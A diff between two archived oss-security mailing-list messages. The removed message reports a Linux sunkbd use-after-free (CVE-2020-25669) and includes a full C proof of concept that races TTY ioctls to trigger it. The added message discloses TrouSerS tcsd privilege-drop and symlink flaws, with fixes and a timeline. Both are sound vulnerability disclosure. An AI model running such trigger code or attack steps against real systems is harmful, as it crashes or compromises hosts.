@@ -1,229 +1,294 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2020/11/20/5
-Message-ID: <CA+-U7QAmO3QQc--t0rQrMC3qwLbKpxpWPH6GPm5LK_0q=40pog@mail.gmail.com>
-Date: Fri, 20 Nov 2020 22:41:54 +0800
-From: - Nop <nopitydays@...il.com>
-To: oss-security@...ts.openwall.com
-Subject: Re: CVE-2020-25669: Linux Kernel use-after-free in sunkbd_reinit
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2020/08/04/1
+Message-ID: <0cf2322ef0b53c547c97da091b18f539a0fe51af.camel@linux.ibm.com>
+Date: Tue, 04 Aug 2020 12:43:48 -0700
+From: Debora Velarde Babb <debora@...ux.ibm.com>
+To: Marco Benatto <mbenatto@...hat.com>, oss-security@...ts.openwall.com
+Cc: trousers-tech@...ts.sourceforge.net
+Subject: Re: [TrouSerS-tech] Multiple Security Issues in the TrouSerS tpm1.2 tscd Daemon
 Content-Type: text/plain; charset=utf-8
 
-Hi,
+On Mon, 2020-08-03 at 12:32 -0300, Marco Benatto wrote:
+> Hello,
+> 
+> Is there any follow up already for this issue in upstream (CVE
+> assigned or upstream commits)?
+> 
+> Thanks,
+> 
+> Marco Benatto
+> Red Hat Product Security
+> secalert@...hat.com for urgent response
+> 
 
-Patch for this issue is available at
-https://github.com/torvalds/linux/commit/77e70d351db7de07a46ac49b87a6c3c7a60fca7e
+Not yet but I am working on creating a CVE and committing the patches.
+This is my first time creating a CVE so trying to understand the
+process.
 
-Regards,
-Bodong Zhao
+Thanks,
+Debbie
 
-On Thu, Nov 5, 2020 at 9:52 AM - Nop <nopitydays@...il.com> wrote:
+> On Wed, May 20, 2020 at 9:55 AM Matthias Gerstner <mgerstner@...e.de>
+> wrote:
+> > 
+> > Hello,
+> > 
+> > I have discovered multiple security issues in the tcsd daemon of
+> > the TrouSerS
+> > [1] tpm 1.2 stack.
+> > 
+> > Introduction
+> > ============
+> > 
+> > The tcsd daemon manages access to the tpm 1.2 compliant /dev/tpm0
+> > device on
+> > Linux systems. The daemon utilizes an unprivileged user and group
+> > account to
+> > run as. These are called tss:tss by default.
+> > 
+> > The tcsd can be started directly as the tss user and group e.g. via
+> > systemd or
+> > via start-stop-daemon. In this case the /dev/tpm0 device needs to
+> > be owned by
+> > the tss user. This mode of operation is safe and is not affected by
+> > the
+> > following findings.
+> > 
+> > If the tcsd is started with root privileges then it opens /dev/tpm0
+> > as root
+> > and drops privileges to the unprivileged user afterwards. In this
+> > case the tss
+> > user can achieve privilege escalations. The following logic is
+> > performed by
+> > the tcsd:
+> > 
+> > 1) the daemon reads in the configuration in /etc/tcsd.conf after
+> > making sure
+> >   that the config file is owned by tss:tss mode 0600 (function
+> >   `conf_file_init()`). From this configuration file the path
+> > `system_ps_file`
+> >   (by default /var/lib/tpm/system.data) is parsed and used for
+> > further
+> >   operations.
+> > 
+> > 2) the daemon makes sure that the directory where the
+> > `system_ps_file` is
+> >   contained in exists (function `ps_dirs_init()`, /var/lib/tpm by
+> > default).
+> >   The directory is created, if necessary, using `mkdir()` and mode
+> > 0700.
+> >   Afterwards an explicit `chown()` to mode 0700 is made in case the
+> > mode of
+> >   the directory doesn't match this mode yet.
+> > 
+> > 3) in the function `ps_init_disk_cache()` the function `get_file()`
+> > is called
+> >   which opens the `system_ps_file` using `O_RDWR|O_CREAT` and mode
+> > 0600:
+> > 
+> >   `openat(AT_FDCWD, "/var/lib/tpm/system.data", O_RDWR|O_CREAT,
+> > 0600) = 4`
+> > 
+> > 4) only after these steps a privilege drop to the tss uid is
+> > performed in
+> >    the `main()` function.
+> > 
+> > Security Issues
+> > ===============
+> > 
+> > The security issues resulting from this are as follows:
+> > 
+> > a) Since /var/lib/tpm is owned by the tss user (as per
+> > dist/Makefile.am), the
+> >    creation of the `system.data` file in step 3) is prone to
+> > symlink attacks. The
+> >    tss user can thereby cause the creation of new files or the
+> > corruption of
+> >    existing files. These new files end up with mode 0600 and no
+> > `chown()` to the
+> >    tss user is performed by the tcsd. Thus it looks like no full
+> > local root
+> >    privilege escalation can be achieved but only DoS attacks.
+> > 
+> > b) The tcsd only drops the root uid, not the root gid in step 4). A
+> > call to
+> >    `setgid()` is missing. Therefore the tcsd continues to run with
+> > root group
+> >    privileges it doesn't actually require. This could allow further
+> > privilege
+> >    escalations when combined with other, yet unknown attack
+> > vectors.
+> > 
+> > c) The configuration file /etc/tcsd.conf is _required_ by the tcsd
+> > to be
+> >    owned by tss:tss mode 0600. Therefore the unprivileged user can
+> > change all
+> >    daemon related settings, including the `system_ps_file` path.
+> > This means
+> >    the `mkdir()` and `chmod()` performed in step 2) can be directed
+> > to an
+> >    arbitrary path. This also includes the symlink attack described
+> > in a)
+> >    for arbitrary paths.
+> > 
+> >    Further security issues could stem from this by manipulating
+> > other config
+> >    file options. I did not look deeper into this.
+> > 
+> > d) Not directly related to the logic above. The example RPM spec
+> > file [5] in
+> >    the TrouSerS repository is using unsafe file and directory modes
+> > for
+> >    /var/lib/tpm and /usr/sbin/tcsd:
+> > 
+> >    ```
+> >    # create the default location for the persistent store files
+> >    if test -e %{_localstatedir}/tpm; then
+> >         mkdir -p %{_localstatedir}/tpm
+> >         /bin/chown tss:tss %{_localstatedir}/tpm
+> >         /bin/chmod 1777 %{_localstatedir}/tpm
+> >    fi
+> > 
+> >    # chown the daemon
+> >    /bin/chown tss:tss %{_sbindir}/tcsd
+> >    ```
+> > 
+> >    So here a public sticky-bit directory is setup in /var/lib/tpm.
+> > This could
+> >    allow arbitrary users to setup the symlink attack mentioned in
+> > a). It could
+> >    also lead to an information leak. Once the tcsd is started as
+> > root the mode
+> >    of /var/lib/tpm will be corrected in step 1), however.
+> > 
+> >    Passing ownership of /usr/sbin/tcsd to the tss user would allow
+> > the tss
+> >    user to replace the tcsd binary by malicious code that will
+> > potentially be
+> >    executed by the root user, leading to arbitrary code execution.
+> > 
+> >    I'm not aware of any distribution actually using this spec file
+> > or parts of
+> >    it. Still it is a very bad example.
+> > 
+> > Mitigation and Bugfixes
+> > =======================
+> > 
+> > It seems best to me to run the tcsd as the tss:tss user and group
+> > right away
+> > and to not rely on the privilege drop logic implemented in the
+> > daemon itself.
+> > All of a), b) and c) should no longer be problematic in this case.
+> > I found
+> > that on Debian and Gentoo Linux this is already the case. To make
+> > this work a
+> > udev rule needs to be packaged that passes ownership of /dev/tpm0
+> > device to
+> > the tss user. To prevent regressions when switching from the
+> > privilege drop
+> > approach to this new approach, a possibly already existing
+> > /var/lib/tpm/system.auth file needs to be safely chown()'ed to the
+> > tss user
+> > during package updates.
+> > 
+> > On SUSE and Fedora Linux the tcsd is started as root via systemd,
+> > thus they
+> > are affected by the security issues. A preliminary suggested source
+> > code fix
+> > is attached to this mail. It makes sure that `O_NOFOLLOW` is added
+> > to step 3)
+> > to prevent a symlink attack. It also adds a drop of the root gid to
+> > the tss
+> > gid. And it modifies the check of /etc/tcsd.conf such that
+> > ownership root:tss
+> > and mode 0640 are necessary. The packaging needs to be adjusted
+> > accordingly.
+> > 
+> > The correct long term fix should probably be to *only* open
+> > /dev/tpm0 as root,
+> > immediately drop to tss:tss and only then perform the further
+> > initialization
+> > steps. The initialization sequence in `tcsd_startup()` is currently
+> > running
+> > completely in the root user context and seems rather complex. Maybe
+> > there are
+> > more details to this that I don't know of yet. For this reason I
+> > didn't try a
+> > patch in this direction yet.
+> > 
+> > Upstream Reporting
+> > ==================
+> > 
+> > I reported issues a), b) and d) privately to the documented
+> > upstream contacts
+> > without much success (see Timeline below). The SUSE Security Team
+> > 90 days
+> > maximum disclosure time has been reached, therefore I'm publishing
+> > this now in
+> > an uncoordinated way. While working on a fix I additionally
+> > discovered issue
+> > c). SUSE is tracking the issues in bsc#1164472 [6] currently.
+> > 
+> > Issues a), b) and c) deserve CVE assignments in my opinion. I can't
+> > request
+> > CVEs myself though, because IBM upstream is a CNA themselves.
+> > Therefore
+> > upstream is required to assign their own CVEs.
+> > 
+> > Timeline
+> > ========
+> > 
+> > 2020-02-19: I reported findings a), b) and d) to 
+> > honclo@...ux.vnet.ibm.com,
+> >             the security contact of the project according to the
+> > README file [2].
+> > 2020-02-28: I reported findings a), b) and d) to 
+> > debora@...ux.ibm.com, the
+> >             maintainer of the project according to the AUTHORS file
+> > [3].
+> > 2020-03-16: I received a reply from debora@...ux.ibm.com, stating
+> > that she
+> >             will look into the findings.
+> > 2020-05-06: I reminded debora@...ux.ibm.com that the latest
+> > disclosure time
+> >             [4] for the findings is approaching and asked for any
+> > updates.
+> > 2020-05-20: I started working on a bugfix and mitigations,
+> > discovered the
+> >             additional finding c) and started publishing the
+> > findings.
+> > 
+> > [1]: https://sourceforge.net/projects/trousers
+> > [2]: 
+> > https://sourceforge.net/p/trousers/trousers/ci/master/tree/README
+> > [3]: 
+> > https://sourceforge.net/p/trousers/trousers/ci/master/tree/AUTHORS
+> > [4]: https://en.opensuse.org/openSUSE:Security_disclosure_policy
+> > [5]: 
+> > https://sourceforge.net/p/trousers/trousers/ci/master/tree/dist/trousers.spec.in
+> > [6]: https://bugzilla.suse.com/show_bug.cgi?id=1164472
+> > 
+> > Best Regards
+> > 
+> > Matthias
+> > 
+> > --
+> > Matthias Gerstner <matthias.gerstner@...e.de>
+> > Dipl.-Wirtsch.-Inf. (FH), Security Engineer
+> > https://www.suse.com/security
+> > Phone: +49 911 740 53 290
+> > GPG Key ID: 0x14C405C971923553
+> > 
+> > SUSE Software Solutions Germany GmbH
+> > HRB 36809, AG Nürnberg
+> > Geschäftsführer: Felix Imendörffer
+> > 
+> 
+> 
+> 
+> _______________________________________________
+> TrouSerS-tech mailing list
+> TrouSerS-tech@...ts.sourceforge.net
+> https://lists.sourceforge.net/lists/listinfo/trousers-tech
 
-> Hi,
->
-> We found a use-after-free read in sunkbd_reinit located in
-> drivers/input/keyboard/sunkbd.c,
-> and reproduced it in the latest kernel version (v5.9.4 for now) with
-> CONFIG_KEYBOARD_SUNKBD=y and CONFIG_KASAN=y.
->
-> The root cause of this BUG is :
->
-> The function sunkbd_reinit having been scheduled by sunkbd_interrupt
-> before the struct sunkbd being freed.
-> Though the dangling pointer is set to NULL in sunkbd_disconnect, there is
-> still an alias in sunkbd_reinit thus causing UAF.
->
-> Timeline:
-> * 2020/10/21 - Vulnerability reported to security@...nel.org.
-> * 2020/10/27 - Vulnerability reported to linux-distros@...openwall.org.
-> * 2020/10/27 - CVE-2020-25669 assigned.
-> * 2020/11/05 - Vulnerability opened.
->
-> Regards,
-> Bodong Zhao from Tsinghua University
->
-> ------------------------------------
-> PoC:
->
-> // autogenerated by syzkaller (https://github.com/google/syzkaller)
-> // nop@THU
-> #define _GNU_SOURCE
->
-> #include <endian.h>
-> #include <errno.h>
-> #include <pthread.h>
-> #include <stdint.h>
-> #include <stdio.h>
-> #include <stdlib.h>
-> #include <string.h>
-> #include <sys/syscall.h>
-> #include <sys/types.h>
-> #include <time.h>
-> #include <unistd.h>
-> #include <fcntl.h>
->
-> #include <linux/futex.h>
->
-> static void sleep_ms(uint64_t ms)
-> {
->   usleep(ms * 1000);
-> }
->
-> static uint64_t current_time_ms(void)
-> {
->   struct timespec ts;
->   if (clock_gettime(CLOCK_MONOTONIC, &ts))
->     exit(1);
->   return (uint64_t)ts.tv_sec * 1000 + (uint64_t)ts.tv_nsec / 1000000;
-> }
->
-> static void thread_start(void* (*fn)(void*), void* arg)
-> {
->   pthread_t th;
->   pthread_attr_t attr;
->   pthread_attr_init(&attr);
->   pthread_attr_setstacksize(&attr, 128 << 10);
->   int i;
->   for (i = 0; i < 100; i++) {
->     if (pthread_create(&th, &attr, fn, arg) == 0) {
->       pthread_attr_destroy(&attr);
->       return;
->     }
->     if (errno == EAGAIN) {
->       usleep(50);
->       continue;
->     }
->     break;
->   }
->   exit(1);
-> }
->
-> typedef struct {
->   int state;
-> } event_t;
->
-> static void event_init(event_t* ev)
-> {
->   ev->state = 0;
-> }
->
-> static void event_reset(event_t* ev)
-> {
->   ev->state = 0;
-> }
->
-> static void event_set(event_t* ev)
-> {
->   if (ev->state)
->     exit(1);
->   __atomic_store_n(&ev->state, 1, __ATOMIC_RELEASE);
->   syscall(SYS_futex, &ev->state, FUTEX_WAKE | FUTEX_PRIVATE_FLAG, 1000000);
-> }
->
-> static void event_wait(event_t* ev)
-> {
->   while (!__atomic_load_n(&ev->state, __ATOMIC_ACQUIRE))
->     syscall(SYS_futex, &ev->state, FUTEX_WAIT | FUTEX_PRIVATE_FLAG, 0, 0);
-> }
->
-> static int event_isset(event_t* ev)
-> {
->   return __atomic_load_n(&ev->state, __ATOMIC_ACQUIRE);
-> }
->
-> static int event_timedwait(event_t* ev, uint64_t timeout)
-> {
->   uint64_t start = current_time_ms();
->   uint64_t now = start;
->   for (;;) {
->     uint64_t remain = timeout - (now - start);
->     struct timespec ts;
->     ts.tv_sec = remain / 1000;
->     ts.tv_nsec = (remain % 1000) * 1000 * 1000;
->     syscall(SYS_futex, &ev->state, FUTEX_WAIT | FUTEX_PRIVATE_FLAG, 0,
-> &ts);
->     if (__atomic_load_n(&ev->state, __ATOMIC_ACQUIRE))
->       return 1;
->     now = current_time_ms();
->     if (now - start > timeout)
->       return 0;
->   }
-> }
->
-> struct thread_t {
->   int created, call;
->   event_t ready, done;
-> };
->
-> static struct thread_t threads[2];
-> static void execute_call(int call);
-> static int running;
->
-> static void* thr(void* arg)
-> {
->   struct thread_t* th = (struct thread_t*)arg;
->   for (;;) {
->     event_wait(&th->ready);
->     event_reset(&th->ready);
->     execute_call(th->call);
->     __atomic_fetch_sub(&running, 1, __ATOMIC_RELAXED);
->     event_set(&th->done);
->   }
->   return 0;
-> }
->
-> static void loop(void)
-> {
->   int i, call, thread;
->   for (call = 0; call < 2; call++) {
->     for (thread = 0; thread < (int)(sizeof(threads) / sizeof(threads[0]));
->          thread++) {
->       struct thread_t* th = &threads[thread];
->       if (!th->created) {
->         th->created = 1;
->         event_init(&th->ready);
->         event_init(&th->done);
->         event_set(&th->done);
->         thread_start(thr, th);
->       }
->       if (!event_isset(&th->done))
->         continue;
->       event_reset(&th->done);
->       th->call = call;
->       __atomic_fetch_add(&running, 1, __ATOMIC_RELAXED);
->       event_set(&th->ready);
->       event_timedwait(&th->done, 45);
->       break;
->     }
->   }
->   for (i = 0; i < 100 && __atomic_load_n(&running, __ATOMIC_RELAXED); i++)
->     sleep_ms(1);
-> }
->
-> uint64_t fd;
-> char buf[100];
->
-> void execute_call(int call)
-> {
->   int disc = 0x2;
->   char ch = 0xff;
->
->   switch (call) {
->   case 0:
->     // call sunkbd_disconnect
->     read(fd, buf, 0);
->     break;
->   case 1:
->     // call sunkbd_interrupt
->     ioctl(fd, 0x5412, &ch); // TIOCSTI
->     break;
->   }
-> }
-> int main(void)
-> {
->   int disc = 0x2;
->   fd = open("/dev/ptmx", O_RDWR, 0);
->   ioctl(fd, 0x5423, &disc); // TIOCSETD
->   loop();
->   return 0;
-> }
->
 
